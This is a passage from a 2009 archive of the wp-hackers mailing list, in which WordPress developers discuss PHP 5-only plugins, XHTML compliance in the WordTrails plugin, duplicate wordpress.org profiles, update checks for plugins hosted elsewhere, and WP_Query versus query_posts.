	http://wordpress.org/extend/plugins/profile/jeckman

and

	http://wordpress.org/support/profile/258633

and

	http://profiles.wordpress.org/jeckman

and

	http://profiles.wordpress.org/johneckman

I know the login to some of these but not all.

Where do they come from? How do I begin to consolidate them, make sure  
they all point to the appropriate plugins, and maybe delete some of  
the duplicates?



----------------------------------------
John Eckman
eckman.john at gmail.com
http://johneckman.com/
http://www.openparenthesis.org/



From public at toppa.com  Wed Oct  7 19:14:57 2009
From: public at toppa.com (Michael Toppa)
Date: Wed, 07 Oct 2009 15:14:57 -0400
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <mailman.4038.1254929153.16651.wp-hackers@lists.automattic.com>
References: <mailman.4038.1254929153.16651.wp-hackers@lists.automattic.com>
Message-ID: <4ACCE8B1.3080000@toppa.com>

I thought this might be a controversial topic, but it looks momentum is 
clearly behind php5. Thanks everyone for your feedback (esp the advise 
on having the plugin gracefully let php4 users know about its php5 
requirement, and to be conscious of the various 5.x distinctions).

Mike T

From peter.westwood at ftwr.co.uk  Wed Oct  7 20:31:01 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 7 Oct 2009 21:31:01 +0100
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
	<4ACC81AA.1010300@toppa.com>
	<161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com>
	<op.u1fx27gnr6yny2@toscho.de>
	<161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>
Message-ID: <42A46058-E949-4E67-A06C-7A6EAC4E73AA@ftwr.co.uk>


On 7 Oct 2009, at 18:49, Otto wrote:

> Version number checking is a bad idea. It's simply not accurate enough
> and doesn't tell you what you need to know.
>
> Checking for extensions, or functions provided by extensions (using
> function_exists or class_exists, etc) is much more accurate and sure
> to work. That's what I check for in the activation checks, whenever a
> plugin depends on something that somebody might not have.
>

+1

All checks should be for the functionality you need not what version  
of software you are running on.

westi
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From Jesse.Silverstein at xerox.com  Wed Oct  7 20:34:53 2009
From: Jesse.Silverstein at xerox.com (Silverstein, Jesse)
Date: Wed, 7 Oct 2009 13:34:53 -0700
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin fromXerox
In-Reply-To: <e4dc67e0910071118vf0f2787lf3936d157c92682c@mail.gmail.com>
References: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com><349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com><523D3234-ABE5-4A92-88B1-8776611E7F7A@striderweb.com><e4dc67e0910041121v832daeeva5258bbf4a3955a5@mail.gmail.com><42DF740CBF5256498541B6CA6DB6E56D04FCC9DA@USA7061MS03.na.xerox.net>
	<e4dc67e0910071118vf0f2787lf3936d157c92682c@mail.gmail.com>
Message-ID: <42DF740CBF5256498541B6CA6DB6E56D04FCCC5F@USA7061MS03.na.xerox.net>

Thanks for the clarification, William. Most of the things you mentioned are what I was referring to as "the easy-to-solve issues."

* I think the info attribute is XHTML transitional compliant, however surely not XHTML strict. I could switch it to title, but the reason I didn't use title in the first place is because the info attribute can contain far more data than I think a title tag ever should: Title, Description/Caption, Editorial Blurg, Tags, and soon Modifiers. I will think more about this issue in particular and come up with a compliant solution.
* I already converted a large number of &s to &amp;s, but I guess there are more I haven't gotten to yet.
* DIVs inside As was already only my list to fix
* Empty optgroup is used for pretty spacing. I'm sure I can get the space with more css tweaking and without the empty group. It was only left that way in the interest of time.

Having an admin panel option to force XHTML Strict compliance may not be as bad as you're making it sound. All of WordTrails' multitude of options are already stored in a single wp_options entry, so that is a non-issue. There is already a hook for when to include one or more of the 3 css files shipped with the plugin. Checking against an option that is already loaded into memory at that point and (not) including an additional css file shouldn't add stress to the system. I will keep the option of a second set of css files in mind as I track down and solve the rest of the XHTML compliance issue (once boss-man lets me spend more time on this). At this point, I'm still leaning toward the admin panel option, just in case there are other (as of yet undiscovered) issues with compliance that need to be solved programmatically.

-Jesse

Jesse.Silverstein at xerox.com
Xerox Trails team
Xerox Research Center, Webster

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of William Canino
Sent: Wednesday, October 07, 2009 2:18 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] [OT] Testing needed for WordTrails plugin fromXerox

Hello Jesse:

> issues in the next version of the plugin. However, the sidebar widget and trail index use divs
> with border-radius CSS, which is not css2 compatible. I think we would like to keep the

I get the impression you are referring to the CSS2 non-compliance,
whereas I meant XHTML non-compliance, such as

* the "info" tag for your convenience so that your jquery code can
pick up what appears on the fancy hovering callout boxes that screen
readers and mobile browsers cannot see anyway.  (I'd have used "title"
instead, if it were my code.)
* & instead of &amp; in urls in hrefs
* div tags inside a tags
* empty optgroups
* ask an xhtml validator for the rest.

> I supposed another option would be to separate out all of the non-compliant css into files that
> are only included based on settings in the plugin. That way, people who don't mind the css
> compliance break can get the pretty divs, and people that need compliance can get it.

This is one way to do this, but then you get more network fetches,
more source code and possibly an extra get_option at runtime. Instead,
I suggest shipping two versions of the css files, with the same
filename. Site admins who need XHTML compliance can plunk the second
one in the first one's place.  It's extra work for the plugin author
maintaining two versions of files, though.

Nonetheless, I believe that people who need compliance are already
using their own CSS and will never use the CSS you ship as-is.

I can hack the patches for the CSS and typos; For the info tag, read
http://stackoverflow.com/questions/883599/on-jquery-metadata-and-xhtml-compliance
.


2009/10/7 Silverstein, Jesse <Jesse.Silverstein at xerox.com>:
> Working up a php snippet to add trail following to post templates is on our to-do list for a near-future version. We realize that not everyone has sidebars, or wants to use them for trail following. However, if someone hacks it out for us, it may get added sooner, so everyone can benefit :) If you're interested in pulling the information, check out the WordTrailsWidget class for details on how to access the data.
>
> The issue of XHTML compliance is a tricky one. The plugin was developed with XHTML compliance in mind, but we have slipped in a few places. I will be addressing the easy-to-solve issues in the next version of the plugin. However, the sidebar widget and trail index use divs with border-radius CSS, which is not css2 compatible. I think we would like to keep the rounded corners, but in doing so, we may be dropping the possibility of compliance. That said, once we fix the rest of the compliance breaks, it would be easy to rip out all of the border-radius entries in our css files (conveniently located in a css folder).
>
> I supposed another option would be to separate out all of the non-compliant css into files that are only included based on settings in the plugin. That way, people who don't mind the css compliance break can get the pretty divs, and people that need compliance can get it.
>
> Thanks for the feedback so far. Keep it coming!
>
> -Jesse
>
> Jesse.Silverstein at xerox.com
> Xerox Trails team
> Xerox Research Center, Webster
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of William Canino
> Sent: Sunday, October 04, 2009 2:22 PM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] [OT] Testing needed for WordTrails plugin fromXerox
>
>> I agree it could be better marked. ?I hope there is a way to put those links
>> at the bottom of each article instead of in the sidebar....
>>
>> Stephen
>
> Exactly what I said and exactly the first mod I will do to this plugin.
>
> I cannot presume that my readers have 27-inch monitors.
>
> W
>
>
> 2009/10/4 Stephen Rider <wp-hackers at striderweb.com>:
>>
>> On Oct 4, 2009, at 12:19 PM, scribu wrote:
>>
>>> I like the ideea of trails, but I can't figure out how to view one.
>>>
>>> I can't get past the Bird's eye view here:
>>> http://blog.trailmeme.com/trails/?t=2bffff2a-efe8-102c-b39a-12313a00c9d2
>>
>> Look for the "Word Trails" sidebar on the right side.
>> <http://blog.trailmeme.com/2009/09/about-trails/?t=8>
>>
>> I agree it could be better marked. ?I hope there is a way to put those links
>> at the bottom of each article instead of in the sidebar....
>>
>> Stephen
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From wordpress at dd32.id.au  Wed Oct  7 20:51:53 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 08 Oct 2009 07:51:53 +1100
Subject: [wp-hackers] Profile madness
In-Reply-To: <6225FB64-5576-4B72-9204-366AF6D1F6E5@gmail.com>
References: <6225FB64-5576-4B72-9204-366AF6D1F6E5@gmail.com>
Message-ID: <op.u1f6wmhzspxmuu@dd32.no-ip.com>

WordPress Logins are shared across all *.wordpress.org/* sites.
You can recover your password for any of them through the support forums:  
http://wordpress.org/support/bb-login.php

You'll probably have an empty profile on wordpress.org/extend/themes/ too  
I'd say.

http://profiles.wordpress.org/ is where WordPress.org is heading, to  
enhance the user-experience by locating everything about you in one place,  
I'd say the support forums profiles and extend profiles will redirect here  
at some stage..

As for combining them.. Well.. I'm not sure how to go about that.. Just  
use one profile and let the other rot away and never touch it or use it  
for anything, makes things simpler.

On Thu, 08 Oct 2009 06:02:31 +1100, John Eckman <eckman.john at gmail.com>  
wrote:

> Sorry if this is a RTFM - feel free to point me there if it is.
>
> I feel like I've got proliferating profiles on *.wordpress.org/*
>
> Here's what I know so far (I worry there might be others!):
>
> 	http://wordpress.org/extend/plugins/profile/johneckman
>
> and
>
> 	http://wordpress.org/extend/plugins/profile/jeckman
>
> and
>
> 	http://wordpress.org/support/profile/258633
>
> and
>
> 	http://profiles.wordpress.org/jeckman
>
> and
>
> 	http://profiles.wordpress.org/johneckman
>
> I know the login to some of these but not all.
>
> Where do they come from? How do I begin to consolidate them, make sure
> they all point to the appropriate plugins, and maybe delete some of
> the duplicates?
>
>
>
> ----------------------------------------
> John Eckman
> eckman.john at gmail.com
> http://johneckman.com/
> http://www.openparenthesis.org/
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au
WordPressQI: http://wordpressqi.com/

From if.website at gmail.com  Wed Oct  7 21:56:01 2009
From: if.website at gmail.com (Austin Matzko)
Date: Wed, 7 Oct 2009 16:56:01 -0500
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
	<4ACC81AA.1010300@toppa.com>
	<161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com>
	<op.u1fx27gnr6yny2@toscho.de>
	<161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>
Message-ID: <674b4a3b0910071456t4ede0813j86cf333d8e6abc5c@mail.gmail.com>

On Wed, Oct 7, 2009 at 12:49 PM, Otto <otto at ottodestruct.com> wrote:
> Version number checking is a bad idea. It's simply not accurate enough
> and doesn't tell you what you need to know.
>
> Checking for extensions, or functions provided by extensions (using
> function_exists or class_exists, etc) is much more accurate and sure
> to work. That's what I check for in the activation checks, whenever a
> plugin depends on something that somebody might not have.

I agree with the principle of checking behavior rather than version
number, and it's something I make a point of doing in JavaScript
especially (rather than depending on user-agent strings, for example).

However, to me what makes PHP 5 much better than PHP 4 is not
especially that PHP 5 has a few more functions like
timezone_offset_get(), but the syntactical differences: true private
methods, abstract classes, object interfaces, error handling, etc.
The trouble is that PHP 5-specific syntax won't even parse in PHP 4,
so I'm at a loss as how to alert PHP 4 users gracefully that my
WordPress plugin requires PHP 5.  I suppose I could check for the
existence of arbitrary PHP 5-only functions, but that runs the risk of
false positives thanks to something like wp-includes/compat.php or the
plugin equivalent.  And it, like version number checking, violates the
principle of checking for behavior.

So does anybody have any suggestions about a robust way to warn PHP 4
users that a WordPress plugin uses PHP 5 syntax?

From Jesse.Silverstein at xerox.com  Thu Oct  8 00:16:05 2009
From: Jesse.Silverstein at xerox.com (Silverstein, Jesse)
Date: Wed, 7 Oct 2009 17:16:05 -0700
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <674b4a3b0910071456t4ede0813j86cf333d8e6abc5c@mail.gmail.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com><4ACC81AA.1010300@toppa.com><161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com><op.u1fx27gnr6yny2@toscho.de><161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>
	<674b4a3b0910071456t4ede0813j86cf333d8e6abc5c@mail.gmail.com>
Message-ID: <42DF740CBF5256498541B6CA6DB6E56D04FCCD2F@USA7061MS03.na.xerox.net>

Along these lines, is there an easy/safe way to check if a const
variable in a class will be accessed properly, versus throwing a fatal
error? It seems like some_method(ClassName::CONST_VAR); will throw a
fatal error in PHP 4 (I'm assuming because class constants are not
supported in 4). So, instead of checking for PHP version 5 or greater,
how would I check specifically for constant variable support?

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Austin
Matzko
Sent: Wednesday, October 07, 2009 5:56 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] looking for opinions on php5-only plugins

On Wed, Oct 7, 2009 at 12:49 PM, Otto <otto at ottodestruct.com> wrote:
> Version number checking is a bad idea. It's simply not accurate enough
> and doesn't tell you what you need to know.
>
> Checking for extensions, or functions provided by extensions (using
> function_exists or class_exists, etc) is much more accurate and sure
> to work. That's what I check for in the activation checks, whenever a
> plugin depends on something that somebody might not have.

I agree with the principle of checking behavior rather than version
number, and it's something I make a point of doing in JavaScript
especially (rather than depending on user-agent strings, for example).

However, to me what makes PHP 5 much better than PHP 4 is not
especially that PHP 5 has a few more functions like
timezone_offset_get(), but the syntactical differences: true private
methods, abstract classes, object interfaces, error handling, etc.
The trouble is that PHP 5-specific syntax won't even parse in PHP 4,
so I'm at a loss as how to alert PHP 4 users gracefully that my
WordPress plugin requires PHP 5.  I suppose I could check for the
existence of arbitrary PHP 5-only functions, but that runs the risk of
false positives thanks to something like wp-includes/compat.php or the
plugin equivalent.  And it, like version number checking, violates the
principle of checking for behavior.

So does anybody have any suggestions about a robust way to warn PHP 4
users that a WordPress plugin uses PHP 5 syntax?
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

No virus found in this incoming message.
Checked by AVG - www.avg.com 
Version: 8.5.421 / Virus Database: 270.14.5/2418 - Release Date:
10/07/09 05:18:00

From coenjacobs at gmail.com  Thu Oct  8 00:20:47 2009
From: coenjacobs at gmail.com (Coen Jacobs)
Date: Thu, 8 Oct 2009 02:20:47 +0200
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <bb14187a0910071718t45fc75bte070f2893f7c4c71@mail.gmail.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
	<4ACC81AA.1010300@toppa.com>
	<161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com>
	<op.u1fx27gnr6yny2@toscho.de>
	<161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>
	<674b4a3b0910071456t4ede0813j86cf333d8e6abc5c@mail.gmail.com>
	<42DF740CBF5256498541B6CA6DB6E56D04FCCD2F@USA7061MS03.na.xerox.net>
	<bb14187a0910071718t45fc75bte070f2893f7c4c71@mail.gmail.com>
Message-ID: <bb14187a0910071720v4fc965f2w173889756506fe76@mail.gmail.com>

like Otto mentioned before, you could check for PHP5 support before allowing
the plugin to be activated.

Cheers, Coen

Sent from my Android mobile.

On 8 Oct 2009 02:16, "Silverstein, Jesse" <Jesse.Silverstein at xerox.com>
wrote:

Along these lines, is there an easy/safe way to check if a const
variable in a class will be accessed properly, versus throwing a fatal
error? It seems like some_method(ClassName::CONST_VAR); will throw a
fatal error in PHP 4 (I'm assuming because class constants are not
supported in 4). So, instead of checking for PHP version 5 or greater,
how would I check specifically for constant variable support?

-----Original Message----- From: wp-hackers-bounces at lists.automattic.com[mailto:
wp-hackers-bounces...
No virus found in this incoming message.
Checked by AVG - www.avg.com
Version: 8.5.421 / Virus Database: 270.14.5/2418 - Release Date:
10/07/09 05:18:00

_______________________________________________ wp-hackers mailing list
wp-hackers at lists.automattic....

From Jesse.Silverstein at xerox.com  Thu Oct  8 00:24:53 2009
From: Jesse.Silverstein at xerox.com (Silverstein, Jesse)
Date: Wed, 7 Oct 2009 17:24:53 -0700
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <bb14187a0910071720v4fc965f2w173889756506fe76@mail.gmail.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com><4ACC81AA.1010300@toppa.com><161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com><op.u1fx27gnr6yny2@toscho.de><161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com><674b4a3b0910071456t4ede0813j86cf333d8e6abc5c@mail.gmail.com><42DF740CBF5256498541B6CA6DB6E56D04FCCD2F@USA7061MS03.na.xerox.net><bb14187a0910071718t45fc75bte070f2893f7c4c71@mail.gmail.com>
	<bb14187a0910071720v4fc965f2w173889756506fe76@mail.gmail.com>
Message-ID: <42DF740CBF5256498541B6CA6DB6E56D0503D867@USA7061MS03.na.xerox.net>

> like Otto mentioned before, you could check for PHP5 support before
allowing the plugin to be activated.
>
> Cheers, Coen


>> Version number checking is a bad idea. It's simply not accurate
enough 
>> and doesn't tell you what you need to know.
>>
>> Checking for extensions, or functions provided by extensions (using 
>> function_exists or class_exists, etc) is much more accurate and sure 
>> to work. That's what I check for in the activation checks, whenever a

>> plugin depends on something that somebody might not have.
>>
>
> +1
>
> All checks should be for the functionality you need not what version
of software you are running on.

> westi


These two do not mesh, that is my point. In the case of class constants,
is it acceptable to simply check the PHP version number, or is there a
way (similar to, or using function_exists/class_exists) to check for the
specific functionality that I need.

Jesse

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Coen
Jacobs
Sent: Wednesday, October 07, 2009 8:21 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] looking for opinions on php5-only plugins

like Otto mentioned before, you could check for PHP5 support before
allowing
the plugin to be activated.

Cheers, Coen

Sent from my Android mobile.

On 8 Oct 2009 02:16, "Silverstein, Jesse" <Jesse.Silverstein at xerox.com>
wrote:

Along these lines, is there an easy/safe way to check if a const
variable in a class will be accessed properly, versus throwing a fatal
error? It seems like some_method(ClassName::CONST_VAR); will throw a
fatal error in PHP 4 (I'm assuming because class constants are not
supported in 4). So, instead of checking for PHP version 5 or greater,
how would I check specifically for constant variable support?

-----Original Message----- From:
wp-hackers-bounces at lists.automattic.com[mailto:
wp-hackers-bounces...
No virus found in this incoming message.
Checked by AVG - www.avg.com
Version: 8.5.421 / Virus Database: 270.14.5/2418 - Release Date:
10/07/09 05:18:00

_______________________________________________ wp-hackers mailing list
wp-hackers at lists.automattic....
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

No virus found in this incoming message.
Checked by AVG - www.avg.com 
Version: 8.5.421 / Virus Database: 270.14.5/2418 - Release Date:
10/07/09 20:49:00

From jeremy at visser.name  Thu Oct  8 06:23:30 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Thu, 08 Oct 2009 17:23:30 +1100
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <42A46058-E949-4E67-A06C-7A6EAC4E73AA@ftwr.co.uk>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
	<4ACC81AA.1010300@toppa.com>
	<161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com>
	<op.u1fx27gnr6yny2@toscho.de>
	<161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>
	<42A46058-E949-4E67-A06C-7A6EAC4E73AA@ftwr.co.uk>
Message-ID: <1254983010.9651.3.camel@rillian.narnia.sunriseroad.net>

On Wed, 2009-10-07 at 21:31 +0100, Peter Westwood wrote:
> All checks should be for the functionality you need not what version  
> of software you are running on.

And conversely, don't check for features, when you are really after the
version number (or really after other features than the one you
checked).

Does anybody else remember the days of checking document.layers?

*shudder*


From jeremy at visser.name  Thu Oct  8 06:27:48 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Thu, 08 Oct 2009 17:27:48 +1100
Subject: [wp-hackers] When archive.php is pulled in the theme,
 how does it know what category it applies to before (or as) the
 loop starts?
In-Reply-To: <7235ce780910070409o4fc6d6cfxea52847ff582dffd@mail.gmail.com>
References: <02a401ca4739$a1b6cc20$e5246460$@com>
	<7235ce780910070409o4fc6d6cfxea52847ff582dffd@mail.gmail.com>
Message-ID: <1254983268.9651.6.camel@rillian.narnia.sunriseroad.net>

On Wed, 2009-10-07 at 12:09 +0100, Mike Little wrote:
> $cat = intval( get_query_var('cat') );

Or, if you want to shave off about 0.0000001 millisecond off the
execution time, you can use:

$cat = (int) get_query_var('cat');

/Jeremy's useless tip of the day. :)


From lists at rotorised.com  Thu Oct  8 09:36:03 2009
From: lists at rotorised.com (Ryan McCue)
Date: Thu, 08 Oct 2009 19:36:03 +1000
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <42DF740CBF5256498541B6CA6DB6E56D04FCCD2F@USA7061MS03.na.xerox.net>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com><4ACC81AA.1010300@toppa.com><161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com><op.u1fx27gnr6yny2@toscho.de><161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>	<674b4a3b0910071456t4ede0813j86cf333d8e6abc5c@mail.gmail.com>
	<42DF740CBF5256498541B6CA6DB6E56D04FCCD2F@USA7061MS03.na.xerox.net>
Message-ID: <4ACDB283.7090904@rotorised.com>

Silverstein, Jesse wrote:
> Along these lines, is there an easy/safe way to check if a const
> variable in a class will be accessed properly, versus throwing a fatal
> error?

You should be able to use defined() for this purpose.

-- 
Ryan McCue
<http://ryanmccue.info/>


From tom at motionmill.com  Thu Oct  8 10:34:50 2009
From: tom at motionmill.com (Tom Belmans)
Date: Thu, 8 Oct 2009 12:34:50 +0200
Subject: [wp-hackers] Plugin Upgrades
Message-ID: <5DD3FEAA-D76D-45E3-B5D0-DA707C47D72A@motionmill.com>

Hello,

I have a plugin that is not hosted on wordpress.org and I want to know  
if it is possible to use the built in upgrade system of Wordpress ?
When I update my version number I want an upgrade this plugin link  
displayed in the plugins page, like other plugins.

Is this possible?

kind regards,
Tom


tom belmans technology expert
tel:  +32 3 286 80 46
fax: +32 3 286 80 42
tom at motionmill.com	grote steenweg 91
2600 berchem
belgium	

motionmill.com	 	
motionmillis a division of addwittz bvba addwittz.com


From wordpress at dd32.id.au  Thu Oct  8 10:54:40 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 08 Oct 2009 21:54:40 +1100
Subject: [wp-hackers] Plugin Upgrades
In-Reply-To: <5DD3FEAA-D76D-45E3-B5D0-DA707C47D72A@motionmill.com>
References: <5DD3FEAA-D76D-45E3-B5D0-DA707C47D72A@motionmill.com>
Message-ID: <op.u1g9xeadspxmuu@dd32.no-ip.com>

You'll have to duplicate most of the UI code WordPress uses (Well, I lie,  
Just hook into update_option_update_plugins filter and filter the update  
liist with an update check)

Once you insert the update there... i think everything else should pretty  
much work... Else look into /wp-admin/includes/class-wp-upgrader.php

On Thu, 08 Oct 2009 21:34:50 +1100, Tom Belmans <tom at motionmill.com> wrote:

> Hello,
>
> I have a plugin that is not hosted on wordpress.org and I want to know
> if it is possible to use the built in upgrade system of Wordpress ?
> When I update my version number I want an upgrade this plugin link
> displayed in the plugins page, like other plugins.
>
> Is this possible?
>
> kind regards,
> Tom
>
>
> tom belmans technology expert
> tel:  +32 3 286 80 46
> fax: +32 3 286 80 42
> tom at motionmill.com	grote steenweg 91
> 2600 berchem
> belgium	
>
> motionmill.com	 	
> motionmillis a division of addwittz bvba addwittz.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au
WordPressQI: http://wordpressqi.com/

From marvinc at gmail.com  Thu Oct  8 11:29:58 2009
From: marvinc at gmail.com (MarvinC)
Date: Thu, 8 Oct 2009 07:29:58 -0400
Subject: [wp-hackers] Help adding image rotators side-by-side
Message-ID: <604360770910080429h286312dag7329012d8ea9e0e1@mail.gmail.com>

This may not qualify as a WP Hack but I wonder if someone can assist me with
a change I'd like to impliment in a WordPress theme? The name of the theme
is Greed and info on it can be found at the following link:

http://www.wpdesigner.com/2007/05/27/greed-wordpress-theme/

Support for the theme appears to dead so I'm scowering the net in search of
ways to do what is probably basic. What I'm trying to do is simply display
two image rotator systems side-by-side. One is called the Front Page
Scroller and the other one would be something like a slider or rotating
flash gallery that displays based on Post or Category ID's. I'm OK when it
comes to using tables and rows but what I can't figure out is how to display
items side by side using DIV statements and what verbiage to add to the
style sheet.
So where I'd add:

<table width="100%">
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
</table>

I'm searching for any tuts or direction that can possibly help me to figure
this out on my own therefore any responses from the list would be very
helpful and appreciated.
Also would anyone be able to recommend a sliding post or featured Post
type plugin that rotates?

tia

From notfornoone at gmail.com  Thu Oct  8 13:14:07 2009
From: notfornoone at gmail.com (Luke Gallagher)
Date: Fri, 9 Oct 2009 00:14:07 +1100
Subject: [wp-hackers]  wp_query gets poisoned by new WP_Query objects
Message-ID: <D5C3FB82-0D76-4BD5-AC8C-D330AEDF557F@gmail.com>

While working with Wordpress I found some odd behaviour, and before I  
continue to get this patched I am wondering if anyone can verify that  
this is actually bug or if it is the intended behaviour of Wordpress.

Here is a previous bug that may be related:
http://core.trac.wordpress.org/ticket/9854

I have verified that the following is the case for the current  
checkout of the Wordpress core.

If I create a custom wp_query object in the default theme's page.php  
file, right after get_header() like so:
http://gist.github.com/204994

and I have a posts_join filter in /wp-content/themes/default/ 
functions.php that prints out to the error_log what type of request  
this is. ( I also tried this out with posts_where and pre_get_posts  
with the same results )

Loading the about page in the web browser I get the following in error  
log:

is_page
is_singular
-------
is_page
is_singular
-------


But if I do it this way I get:
http://gist.github.com/204996

is_page
is_singular
-------
is_archive
is_category
-------


I would think that the latter result is the correct behaviour, should  
be so in the first instance.

Using query_posts instead in the same situation works:
http://gist.github.com/205004

is_page
is_singular
-------
is_archive
is_category
-------

So should I just be using query_posts in this context?
Is there something that I'm missing here?

thanks,

Luke




From otto at ottodestruct.com  Thu Oct  8 13:44:36 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 8 Oct 2009 08:44:36 -0500
Subject: [wp-hackers] wp_query gets poisoned by new WP_Query objects
In-Reply-To: <D5C3FB82-0D76-4BD5-AC8C-D330AEDF557F@gmail.com>
References: <D5C3FB82-0D76-4BD5-AC8C-D330AEDF557F@gmail.com>
Message-ID: <161617690910080644j3931ba3fq2d7ab2bdeadd4cb@mail.gmail.com>

Well, I'm honestly not sure why you're cloning and then overwriting
$wp_query to begin with, but yes, in this context, you should be using
query_posts.

When you want to override the "main" query, you use query_posts.

When you want to create a new, separate query, you use a new WP_Query
object (assigned to some local variable).

In no real case that I can think of would you want to create a new
WP_Query and assign it to the global $wp_query variable.

-Otto



On Thu, Oct 8, 2009 at 8:14 AM, Luke Gallagher <notfornoone at gmail.com> wrote:
> While working with Wordpress I found some odd behaviour, and before I
> continue to get this patched I am wondering if anyone can verify that this
> is actually bug or if it is the intended behaviour of Wordpress.
>
> Here is a previous bug that may be related:
> http://core.trac.wordpress.org/ticket/9854
>
> I have verified that the following is the case for the current checkout of
> the Wordpress core.
>
> If I create a custom wp_query object in the default theme's page.php file,
> right after get_header() like so:
> http://gist.github.com/204994
>
> and I have a posts_join filter in /wp-content/themes/default/functions.php
> that prints out to the error_log what type of request this is. ( I also
> tried this out with posts_where and pre_get_posts with the same results )
>
> Loading the about page in the web browser I get the following in error log:
>
> is_page
> is_singular
> -------
> is_page
> is_singular
> -------
>
>
> But if I do it this way I get:
> http://gist.github.com/204996
>
> is_page
> is_singular
> -------
> is_archive
> is_category
> -------
>
>
> I would think that the latter result is the correct behaviour, should be so
> in the first instance.
>
> Using query_posts instead in the same situation works:
> http://gist.github.com/205004
>
> is_page
> is_singular
> -------
> is_archive
> is_category
> -------
>
> So should I just be using query_posts in this context?
> Is there something that I'm missing here?
>
> thanks,
>
> Luke
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Thu Oct  8 13:46:05 2009
From: scribu at gmail.com (scribu)
Date: Thu, 8 Oct 2009 16:46:05 +0300
Subject: [wp-hackers] Help adding image rotators side-by-side
In-Reply-To: <604360770910080429h286312dag7329012d8ea9e0e1@mail.gmail.com>
References: <604360770910080429h286312dag7329012d8ea9e0e1@mail.gmail.com>
Message-ID: <349fe48b0910080646l3a0e3534neb4615d17e09ca8b@mail.gmail.com>

Try jCarousel - a jQuery plugin.

-- 
http://scribu.net

From gaarai at gaarai.com  Thu Oct  8 13:54:28 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Thu, 08 Oct 2009 08:54:28 -0500
Subject: [wp-hackers] wp_query gets poisoned by new WP_Query objects
In-Reply-To: <D5C3FB82-0D76-4BD5-AC8C-D330AEDF557F@gmail.com>
